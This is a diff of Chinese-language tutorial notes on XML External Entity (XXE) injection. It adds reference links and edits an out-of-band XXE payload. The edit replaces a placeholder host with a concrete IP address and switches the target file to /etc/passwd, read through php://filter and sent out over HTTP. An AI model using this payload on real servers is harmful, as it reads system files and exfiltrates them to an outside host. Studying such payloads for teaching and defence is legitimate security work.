@@ -10,6 +10,10 @@ https://www.freebuf.com/articles/web/177979.html
 
 https://www.w3school.com.cn/xml/xml_intro.asp
 
+ https://www.anquanke.com/post/id/156227#h2-1 
+
+ https://www.anquanke.com/post/id/155328 
+
 ## xml语法基础
 
 xml 是语法类似html
@@ -163,12 +167,12 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
 ```xml
 <?xml version="1.0" encoding="utf-8"?> 
 <!DOCTYPE roottag [ 
-<!ENTITY % dtd SYSTEM "http://x.x.x.x/evil.txt"> 
+<!ENTITY % dtd SYSTEM "http://39.108.164.219:60001/evil.txt"> 
 %dtd;%int;%send; ]> 
 
 evil.txt
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/secret">
-<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://x.x.x.x:9999/?p=%file;'>">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://39.108.164.219:60000/?p=%file;'>">
 ```
 
 通过 `<![CDATA[`和 `]]>`将payload包裹起来，使其不解析为XML就可以读取文件
